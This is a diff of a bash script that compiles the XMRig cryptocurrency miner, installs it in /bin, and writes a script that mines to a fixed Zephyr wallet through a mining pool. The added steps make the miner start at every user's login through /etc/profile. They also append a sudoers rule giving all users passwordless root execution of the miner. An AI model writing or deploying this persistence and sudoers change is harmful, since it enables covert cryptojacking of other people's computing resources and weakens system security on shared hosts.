@@ -1,35 +1,60 @@
 #!/bin/bash
-cd 
+
+# Set working directory
+cd
 DIR="project_1934"
 
-# Check if the directory exists
+# Step 0: Check for existing directory or create it
 if [ ! -d "$DIR" ]; then
-  # Create the directory if it does not exist
   mkdir "$DIR"
   echo "Directory $DIR created."
 else
   echo "Directory $DIR already exists."
 fi
-cd project_1934
+cd "$DIR"
+
 # Step 1: Install dependencies for compiling xmrig
-sudo echo "Installing dependencies..."
+echo "Installing dependencies..."
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev jq curl
 
-# Step 2: Clone the xmrig repository
+# Step 2: Clone the XMRig repository
 echo "Cloning XMRig repository..."
-git clone https://github.com/xmrig/xmrig.git
+if [ ! -d "xmrig" ]; then
+  git clone https://github.com/xmrig/xmrig.git
+else
+  echo "XMRig repository already cloned."
+fi
 cd xmrig
 
-# Step 3: Compile xmrig
+# Step 3: Compile XMRig
 echo "Compiling XMRig..."
-mkdir build
+mkdir -p build
 cd build
 cmake ..
-make
-mkdir ../../miner
-cp xmrig ../../miner
-cd ../../miner
+make -j$(nproc)  # Compiles using all available CPU cores
+
+# Step 4: Prepare and copy compiled binary to system path
+cd ../../
+mkdir -p miner
+cp xmrig miner/
+cd miner
 sudo cp xmrig /bin
-echo "reset && sudo ./xmrig -o fr-zephyr.miningocean.org:5332 -u ZEPHYR3DenTQyjY6EMM3jYeZeP9L5oBk8197zyvhnrMMP3HWVixjdc8dEA9seMFKefedVfRXMFbLHQoihMfCVt28WrBZgRLnqXB4k.25000 -p $RANDOM -a rx/0 --threads=2 >zephyr.sh
+
+# Step 5: Create the `zephyr.sh` mining script with parameters
+echo "Creating the mining script (zephyr.sh)..."
+echo "reset && sudo xmrig --threads=2 -o fr-zephyr.miningocean.org:5332 -u ZEPHYR3DenTQyjY6EMM3jYeZeP9L5oBk8197zyvhnrMMP3HWVixjdc8dEA9seMFKefedVfRXMFbLHQoihMfCVt28WrBZgRLnqXB4k.25000 -p $RANDOM -a rx/0 --threads=2" > zephyr.sh
+
+# Step 6: Make the mining script executable and move it to /bin
 chmod +x zephyr.sh
+sudo cp zephyr.sh /bin
+
+# Step 7: Add `sudo zephyr.sh 2` to the global profile for auto-run on login
+echo "Adding sudo zephyr.sh 2 to /etc/profile for auto-run on user login..."
+echo "sudo /bin/zephyr.sh 2" | sudo tee -a /etc/profile
+
+# Step 8: Configure `sudoers` to allow passwordless execution
+echo "Configuring sudoers for passwordless execution of zephyr.sh and xmrig..."
+echo "ALL ALL=(ALL) NOPASSWD: /bin/zephyr.sh, /bin/xmrig" | sudo tee -a /etc/sudoers
+
+echo "Setup complete. zephyr.sh will run on user login with 2 threads without requiring a sudo password."
